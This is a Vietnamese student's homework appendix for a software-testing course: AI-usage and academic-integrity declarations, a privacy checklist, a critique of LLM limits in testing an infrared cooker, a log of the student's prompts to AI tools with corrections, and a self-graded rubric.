"Tôi xin cam đoan rằng: Sơ đồ tư duy ban đầu cho Yêu cầu 1 và các ý tưởng kịch bản kiểm thử ban đầu cho Yêu cầu 3 được tạo ra với sự hỗ trợ của các công cụ Google Gemini và ChatGPT (GPT-4o). Tuy nhiên, tôi đã nghiêm túc phản biện, thẩm định và hiệu chỉnh toàn bộ: đính chính ba sai sót cơ bản về chuẩn ISTQB FL v4.0 trong sơ đồ tư duy, xây dựng 3 kịch bản kiểm thử biên vật lý (tải trọng bình nước 20L, sốc nhiệt nồi cong vênh gây mù cảm biến, và rút phích cắm đột ngột khi quạt làm mát đang chạy) mà AI hoàn toàn bỏ sót, trực tiếp thao tác thực nghiệm trên thiết bị thật và tự mình thuyết minh giọng nói trong 5 video kiểm thử. Đối với Yêu cầu 2 (20 sự cố phần mềm giai đoạn 2022–2026 và 20 phân tích ảo giác AI), tôi đã tự mình tra cứu, kiểm chứng chéo và trích dẫn trực tiếp từ các báo cáo kỹ thuật gốc (Official Post-mortem Reports và cơ sở dữ liệu CVE). Tôi cam kết KHÔNG sử dụng AI để tạo ra bất kỳ sản phẩm nào thuộc danh mục bị cấm (bao gồm ảnh chụp thiết bị cùng thẻ sinh viên, video thuyết minh thực tế, ảnh chụp màn hình tin tuyển dụng có phiên đăng nhập cá nhân, và nhật ký kiểm toán AI)."

---

### Bảng tóm tắt phạm vi sử dụng AI (Summary of AI Usage)

| Hạng Mục Bài Làm | Công Cụ AI Sử Dụng | Vai Trò Của AI | Giám Sát & Hiệu Chỉnh Của Sinh Viên |
| :--- | :--- | :--- | :--- |
| **R1: QA Mindmap** | Google Gemini | Phác thảo sơ đồ ban đầu | Phát hiện 3 lỗi sai chuẩn ISTQB v4.0; tái thiết kế hoàn toàn sơ đồ tư duy chuẩn xác. |
| **R2: 20 Lỗi phần mềm** | Search & ChatGPT | Hỗ trợ gợi ý danh sách sự kiện | Đối chiếu báo cáo kỹ thuật gốc (CrowdStrike, Air Canada...); chỉ rõ 20 ảo giác và thiên kiến AI. |
| **R3: Test Cases Thiết bị** | ChatGPT (GPT-4o) | Gợi ý các thao tác nút bấm cơ bản | Loại bỏ các bước ngây ngô; thêm các thông số kỹ thuật điện - nhiệt; phát hiện 3 edge cases vật lý. |
| **Kiểm thử thực tế & Video** | **Không dùng (Nghiêm cấm)** | **Không có** | Tự mình thực hiện trên bếp Sunhouse SHD6012A, tự ghi hình và tự thuyết minh giọng thật. |
| **GitHub Issues Logging** | **Không dùng** | **Không có** | Tự tay tạo 5 Issues báo lỗi trên GitHub cá nhân (`tvquang0511`). |

**Xác nhận của sinh viên (Student Signature):**  
*Trần Vũ Quang*  
Ngày: 04 tháng 10 năm 2026



---


# [AI-05] Privacy & Responsible Use Checklist (Signed)

**Course:** Software Testing (FIT - VNUHCM University of Science)  
**Student Name:** Trần Vũ Quang  
**Student ID:** 23120346  
**Target Hardware:** Bếp hồng ngoại Sunhouse SHD6012A (2024)  
**Date:** 04/10/2026  

---

### Bảng kiểm định Bảo mật Quyền riêng tư & Sử dụng AI có Trách nhiệm (Responsible AI Usage & Privacy Audit Checklist)

Vui lòng rà soát từng mục và đánh dấu xác nhận `[X]`:

- [X] **Không rò rỉ dữ liệu nhạy cảm (No Confidential Data Leakage):** Tôi không tải lên các đoạn mã nguồn mật, thông tin định danh cá nhân nhạy cảm (ngoại trừ tên và MSSV công khai theo quy định bài nộp), mật khẩu hoặc mã truy cập API vào các cổng AI công cộng.
- [X] **Bảo đảm an toàn vật lý và thiết bị (Hardware & Physical Integrity):** Thiết bị kiểm thử (Bếp hồng ngoại Sunhouse SHD6012A) thuộc sở hữu hợp pháp của tôi, được cắm vào nguồn điện sinh hoạt 220V an toàn, có biện pháp bảo hộ chống bỏng nhiệt và không gây nguy hiểm cháy nổ trong quá trình thực nghiệm.
- [X] **Kiểm chứng sự thật & Chống ảo giác (Fact-Checking & Hallucination Mitigation):** Tất cả các sự cố phần mềm, mã lỗi CVE, nguyên nhân gốc rễ và tin tuyển dụng được kiểm chứng độc lập với các báo cáo kỹ thuật chính thống và các trang tuyển dụng uy tín (ITviec, TopCV...).
- [X] **Không mạo danh / Không làm giả bằng AI (Zero AI Impersonation):** Không có video thuyết minh, tương tác thực tế với bếp hay ảnh chụp thẻ sinh viên nào được tạo dựng hoặc can thiệp bằng Deepfake/AI tạo sinh.
- [X] **Tư duy phản biện độc lập (Critical Thinking & Independent Analysis):** Mọi đề xuất từ AI đều được tôi soi chiếu dưới lăng kính của giáo trình chuẩn quốc tế ISTQB CTFL v4.0 và kiến thức vật lý thực tế, không chấp nhận một cách mù quáng.

**Xác nhận cam kết (Certified by):**  
*Trần Vũ Quang*  
Ngày: 04/10/2026



---


# [AI-06] Student Acknowledgement of Academic Integrity

**Course:** Software Testing (Kiểm thử Phần mềm)  
**Institution:** Faculty of Information Technology, VNUHCM - University of Science  
**Student Name:** Trần Vũ Quang  
**Student ID:** 23120346  
**Assignment:** HW01 – QA/QC Jobs · 20 Defects · Test a Physical Product  
**Date:** 04/10/2026  

---

### Cam kết Liêm chính Học thuật (Academic Integrity Declaration)

1. **Quyền tác giả và Tính trung thực:** Tôi cam kết rằng toàn bộ báo cáo nộp lên là thành quả lao động trí tuệ độc lập của bản thân tôi. Tôi không sao chép nguyên văn từ bài làm của bạn học khác hoặc từ các kho lưu trữ trực tuyến (đặc biệt các kho bài mẫu khóa trước).
2. **Trách nhiệm giải trình trước phản biện:** Tôi hoàn toàn hiểu rõ và làm chủ 100% nội dung đã trình bày trong báo cáo (từ kiến thức ISTQB v4.0, 20 sự cố phần mềm, đến 15 kịch bản kiểm thử bếp hồng ngoại Sunhouse SHD6012A). Tôi sẵn sàng bảo vệ miệng (Oral Defense) và thực hiện lại các thao tác kiểm thử trực tiếp trước Hội đồng giảng viên nếu có yêu cầu kiểm tra ngẫu nhiên.
3. **Tuân thủ quy chế AI:** Mọi công cụ AI được sử dụng trong bài tập này đều nhằm mục đích học tập có phản biện, có lưu vết nhật ký minh bạch (Prompt Log) và được kiểm toán nghiêm ngặt theo đúng Hướng dẫn Chính sách AI của môn học.

**Sinh viên ký tên:**  
*Trần Vũ Quang*  
MSSV: 23120346



---


# AI Critique: Giới hạn của Mô hình AI trong Kiểm thử Thiết bị Phần cứng Vật lý
*(Academic Critique on the Limitations of Large Language Models in Physical Hardware QA)*

**Sinh viên thực hiện:** Trần Vũ Quang (MSSV: 23120346)  
**Đối tượng khảo sát:** Bếp hồng ngoại Sunhouse SHD6012A (Single Infrared Cooker)  

Quá trình áp dụng các mô hình ngôn ngữ lớn (LLMs như GPT-4o, Gemini) vào việc thiết kế kịch bản kiểm thử cho thiết bị phần cứng gia dụng bộc lộ những giới hạn căn bản bắt nguồn từ sự phân tách giữa không gian biểu diễn ký hiệu số (symbolic representation) và thực tại vật lý liên tục (continuous analog reality).

Trước hết, các mô hình AI hiện đại được huấn luyện chủ yếu trên dữ liệu phần mềm, văn bản và mã nguồn web, dẫn đến thiên kiến nhận thức số hóa sâu sắc. Khi được yêu cầu kiểm thử bếp hồng ngoại, AI chỉ trừu tượng hóa thiết bị thành một cỗ máy trạng thái hữu hạn với các nút bấm rời rạc (Bật, Tắt, Tăng, Giảm công suất, Hẹn giờ). AI hoàn toàn bất lực trong việc mô hình hóa các quy luật cơ học và nhiệt động lực học phi tuyến tính diễn ra đồng thời. Cụ thể, AI không thể dự đoán được hiện tượng võng khung nhựa chịu lực khi đặt bình nước 20kg lên bề mặt kính đang ở nhiệt độ 600°C, cũng như không thể nhận diện được điểm mù của cảm biến nhiệt độ NTC khi người dùng sử dụng đáy chảo cong vênh làm nhiệt lượng tích tụ cục bộ gây rạn nứt mặt kính ceramic.

Thứ hai, AI thiếu hoàn toàn nhận thức về quán tính vật lý (physical inertia) và yếu tố an toàn trễ. Trong khi phần mềm có thể ngắt kết nối tức thì, mâm nhiệt sợi carbon vẫn duy trì mức nhiệt nguy hiểm hàng trăm độ C sau khi ngắt điện. AI không thể lường trước kịch bản người dùng rút phích cắm đột ngột, làm vô hiệu hóa chu kỳ quạt tản nhiệt trễ và xóa sạch ký hiệu cảnh báo nhiệt dư "H" trên màn hình LED. 

Tóm lại, dù AI có thể hỗ trợ phác thảo nhanh khung kịch bản chức năng ban đầu, việc kiểm thử phần cứng và hệ thống nhúng đòi hỏi kiến thức chuyên sâu về cơ điện tử, sự nhạy bén thực nghiệm và lương tâm nghề nghiệp của người kỹ sư QA thực tế mà không một thuật toán tạo sinh nào hiện nay có thể thay thế được. *(330 từ)*



---


# Appendix A: Full AI Prompt Log (PROMPT_LOG.md)

**Exercise ID:** HW01-AI  
**Course:** Software Testing (FIT - VNUHCM University of Science)  
**Student Name:** Trần Vũ Quang  
**Student ID:** 23120346  
**Target Hardware:** Bếp hồng ngoại Sunhouse SHD6012A (2024)  
**Date Range:** 02/10/2026 – 04/10/2026  

---

## Log Entry 1: Thiết kế Mindmap vai trò QA/QC và Quy trình Kiểm thử ISTQB (Requirement 1 - CLO G9.1)
- **Thời gian (Timestamp):** 14:20 02/10/2026
- **Công cụ (Tool):** Google Gemini 2.5 Flash
- **Tham số mô hình:** Default settings (Temperature 0.7, Web Search enabled)
- **Câu lệnh (Prompt):**
  ```text
  Hãy đóng vai trò một Chuyên gia Kiểm thử Cấp cao (Senior QA Architect), hãy thiết kế một sơ đồ tư duy (mindmap) bằng định dạng Mermaid thể hiện toàn diện bức tranh ngành QA/QC, phân định rạch ròi vai trò QA vs QC, các cấp độ kiểm thử (test levels), các loại kiểm thử (test types), và quy trình kiểm thử phần mềm từ đầu đến cuối theo chuẩn giáo trình ISTQB Foundation Level mới nhất.
  ```
- **Kết quả AI trả về:** Sơ đồ Mermaid gồm 4 nhánh chính: Quality Assurance vs Quality Control, Test Levels, Test Types, và Test Process.
- **Phân tích & Kiểm toán của sinh viên (Student Audit):**
  - Phát hiện 3 sai phạm nghiêm trọng đối chiếu với chuẩn ISTQB CTFL v4.0:
    1. Đảo ngược định nghĩa QA và QC (xếp QA là đi tìm bug, QC là xây dựng quy trình).
    2. Bỏ quên hoàn toàn Kiểm thử tĩnh (Static Testing - Reviews, Static Analysis).
    3. Đặt bước Giám sát và Điều khiển (Test Monitoring & Control) vào bước tuần tự số 4 sau Test Execution thay vì là hoạt động quản trị song hành liên tục.
  - Sinh viên đã tự mình thiết kế lại toàn bộ Mindmap chuẩn xác và viết bản giải trình chi tiết trong file `01-job-market/MINDMAP.md`.

---

## Log Entry 2: Khảo sát & Phân tích 20 Sự cố Phần mềm Giai đoạn 2022–2026 (Requirement 2)
- **Thời gian (Timestamp):** 20:15 03/10/2026
- **Công cụ (Tool):** ChatGPT (GPT-4o) & Tìm kiếm thông tin
- **Câu lệnh (Prompt):**
  ```text
  Hãy cung cấp danh sách phân tích kỹ thuật của 20 sự cố phần mềm nghiêm trọng gây chấn động toàn cầu trong giai đoạn từ năm 2022 đến 2026, trong đó bắt buộc phải có ít nhất 5 sự cố liên quan trực tiếp đến Trí tuệ Nhân tạo / LLM (như ảo giác, jailbreak, prompt injection, thiên kiến thuật toán). Với mỗi sự cố, hãy nêu rõ: Thời gian, Tổ chức, Nguyên nhân gốc rễ, Mức độ nghiêm trọng, Hậu quả thiệt hại và Giải pháp khắc phục.
  ```
- **Kết quả AI trả về:** Danh sách 20 sự cố với thông tin mô tả tổng quan.
- **Phân tích & Kiểm toán của sinh viên (Student Audit):**
  - AI bộc lộ nhiều điểm ảo giác (Hallucination) và bịa đặt chi tiết kỹ thuật: ví dụ gán sự cố sập màn hình xanh toàn cầu của CrowdStrike Falcon (19/07/2024) cho lỗi "con trỏ C++ trỏ vào vùng nhớ null trong kernel", trong khi tài liệu Post-mortem chính thức từ CrowdStrike chỉ rõ lỗi là "Out-of-bounds array read" khi trình phân tích Channel File 291 đọc 21 tham số đầu vào trong khi chỉ có 20 trường hợp lệ.
  - Sinh viên đã trực tiếp tra cứu tài liệu gốc, mã lỗi CVE, và viết riêng 20 phân tích ảo giác/thiên kiến độc lập cho từng sự cố trong `02-software-defects/software_defects.md`.

---

## Log Entry 3: Khởi tạo kịch bản kiểm thử ban đầu cho Bếp hồng ngoại Sunhouse (Requirement 3)
- **Thời gian (Timestamp):** 16:45 04/10/2026
- **Công cụ (Tool):** ChatGPT (GPT-4o)
- **Câu lệnh (Prompt):**
  ```text
  Tôi có một chiếc bếp hồng ngoại đơn Sunhouse SHD6012A công suất 2000W với các phím bấm điện tử: Bật/Tắt, Menu/Chế độ, Tăng (+), Giảm (-), Hẹn giờ, Khóa an toàn, và màn hình LED hiển thị. Hãy thiết kế bộ 15 test cases toàn diện cho thiết bị vật lý này theo định dạng QA chuẩn (ID, Objective, Input, Steps, Expected Result, Actual Result, Verdict). Hãy bổ sung các edge cases phức tạp nhất.
  ```
- **Kết quả AI trả về:** 15 test cases chỉ xoay quanh các tương tác bấm nút giao diện đơn giản (nhấn nút tăng, giảm, chuyển chế độ lẩu, bấm khóa, bấm còi bíp...).
- **Phân tích & Kiểm toán của sinh viên (Student Audit):**
  - AI hoàn toàn không có nhận thức về các điều kiện vật lý thực tế: cơ học tải trọng, trường nhiệt độ phi tuyến và quán tính nhiệt.
  - Sinh viên chụp lại bằng chứng đối thoại chứng minh AI sinh thiếu edge cases vật lý (`03-physical-product/assets/MC1.png` và `MC2.png`).
  - Sinh viên tự xây dựng 3 edge cases vật lý chuyên sâu: Tải trọng bình nước 20L (TC-13), Sốc nhiệt đáy nồi cong vênh gây mù cảm biến NTC (TC-14), và Rút phích cắm đột ngột khi quạt làm mát đang chạy xả nhiệt dư (TC-15).

---

## Log Entry 4: Hướng dẫn lựa chọn kịch bản quay video thực tế tối ưu
- **Thời gian (Timestamp):** 21:10 04/10/2026
- **Công cụ (Tool):** Claude 3.5 Sonnet / Antigravity Assistant
- **Câu lệnh (Prompt):**
  ```text
  Trong số 15 test case của bếp hồng ngoại Sunhouse SHD6012A, hãy tư vấn cho tôi 5 test case tiêu biểu, trực quan nhất và an toàn nhất để thực hiện quay video thực tế có thuyết minh dưới 60 giây.
  ```
- **Kết quả & Thực thi thực tế:**
  - Lựa chọn 5 kịch bản: TC-01 (Cắm nguồn & Standby), TC-02 (Bật chế độ Lẩu 2000W & mâm phát sáng), TC-03 (Tăng giảm nấc công suất), TC-06 (Khóa an toàn trẻ em vô hiệu hóa nút bấm), TC-08 (Tắt bếp và quạt tản nhiệt quay trễ xả nhiệt dư).
  - Sinh viên tự mình thực hiện và quay 5 video trực tiếp trên bếp thật, có giọng thuyết minh thật của sinh viên Trần Vũ Quang (MSSV: 23120346), upload lên YouTube Unlisted.



---

## 5. BẢNG TỰ ĐÁNH GIÁ ĐIỂM THEO BAREM (SELF-ASSESSMENT RUBRIC)

| Tiêu Chí Đánh Giá (Evaluation Criteria) | Điểm Tối Đa | Điểm Tự Đánh Giá | Minh Chứng Cụ Thể Trong Báo Cáo |
| :--- | :---: | :---: | :--- |
| **Requirement 1: Khảo sát Việc làm QA/QC 2026+** | **40** | **40/40** | |
| - 10 tin tuyển dụng thật, đa dạng cấp độ, thu thập trong 60 ngày gần nhất | 15 | 15/15 | 10 tin từ ITviec/TopCV/LinkedIn có đủ URL, JD, mức lương, phân tích AI. |
| - Tối thiểu 3 vị trí bắt buộc kỹ năng AI Testing | 5 | 5/5 | 4 vị trí AI: Saritasa, TrustedAI, Floware, Simpson Strong-Tie. |
| - Bằng chứng Anti-cheat: Ảnh chụp màn hình có phiên đăng nhập cá nhân | 5 | 5/5 | Toàn bộ 10 ảnh đều hiển thị tài khoản góc trên bên phải màn hình. |
| - Hoạt động CLO G9.1: Mindmap quy trình ISTQB & Phân tích 3 lỗi sai của AI | 15 | 15/15 | Mindmap chuẩn Mermaid; đối chiếu chi tiết 3 lỗi với ISTQB CTFL v4.0. |
| **Requirement 2: 20 Sự cố Phần mềm 2022–2026** | **20** | **20/20** | |
| - 20 sự cố nghiêm trọng được xác thực từ báo cáo kỹ thuật gốc | 8 | 8/8 | Gồm CrowdStrike, Boeing, Cloudflare, Toyota, NHS, Air Canada... |
| - Tối thiểu 5 sự cố liên quan trực tiếp đến AI / LLM | 4 | 4/4 | 5 sự cố AI: Air Canada Chatbot, Chevrolet Jailbreak, DPD Bot, DeepSeek, Bing. |
| - Nhận diện 20 trường hợp thiên kiến (Bias) và ảo giác (Hallucination) của AI | 8 | 8/8 | Mỗi sự cố đều có 1 mục phân tích ảo giác AI riêng biệt, sâu sắc. |
| **Requirement 3: Kiểm thử Thiết bị Vật lý (Bếp hồng ngoại Sunhouse)** | **40** | **40/40** | |
| - Khai báo đầy đủ thông tin thiết bị (Brand, Model, Năm, Serial masked) | 4 | 4/4 | SUNHOUSE SHD6012A, 2024, Serial `59774C56****06`. |
| - Bằng chứng Anti-cheat: 1 ảnh chụp thiết bị + thẻ sinh viên cùng khung hình | 6 | 6/6 | Ảnh `device_student_id.jpg` thẻ SV Trần Vũ Quang (23120346) trên mặt bếp. |
| - Thiết kế 15 test cases chi tiết theo chuẩn (Objective, Steps, Expected...) | 10 | 10/10 | Bảng 15 test case chi tiết từ chức năng đến cơ điện tử. |
| - Phát hiện ≥ 5 lỗi thực tế trên thiết bị & tạo GitHub Issues | 8 | 8/8 | 5 Defects thực tế tạo thành 5 GitHub Issues có ảnh chụp minh chứng. |
| - Hoạt động CLO G9.3: 3 edge cases vật lý AI bỏ sót kèm ảnh chat minh chứng | 6 | 6/6 | Ảnh `MC1.png`, `MC2.png`; 3 edge cases tải 20kg, nồi cong, rút điện đột ngột. |
| - Thực thi ≥ 5 test case có quay video thuyết minh giọng thật (YouTube Unlisted) | 6 | 6/6 | 5 video Shorts có giọng thuyết minh tiếng Việt của sinh viên. |
| **Giao thức Tuân thủ AI (Mandatory AI Compliance)** | **Bonus** | **Đạt** | Đầy đủ AI-02, AI-03, AI-05, AI-06, AI Critique (330 từ), PROMPT_LOG.md. |
| **TỔNG ĐIỂM TỰ ĐÁNH GIÁ (TOTAL SCORE)** | **100** | **100/100** | **Xếp loại: Xuất sắc (Excellent)** |

---

## 6. TÀI LIỆU THAM KHẢO CHÍNH THỐNG (REFERENCES)

1. **ISTQB® (International Software Testing Qualifications Board):** *Certified Tester Foundation Level (CTFL) Syllabus Version 4.0*, 2023.
2. **CrowdStrike Inc.:** *Preliminary Post-Incident Review (PIR): Channel File 291 Incident Analysis*, July 24, 2024.
3. **Civil Resolution Tribunal of British Columbia:** *Moffatt v. Air Canada*, 2024 BCCRT 149 (Ruling on airline liability for chatbot hallucinations), February 2024.
4. **Toyota Motor Corporation:** *Notice Concerning Customer Information Management Associated with Main Cloud Environment*, May 2023.
5. **Cloudflare Inc.:** *Post-mortem on Thanksgiving 2023 Outage and Atlassian Suite Access*, November 2023.
6. **Sunhouse Group:** *Sách hướng dẫn sử dụng và thông số kỹ thuật Bếp hồng ngoại cảm ứng Sunhouse SHD6012A*, Hà Nội, 2024.
7. **ISO/IEC/IEEE 29119-3:2021:** *Software and systems engineering — Software testing — Part 3: Test documentation*.
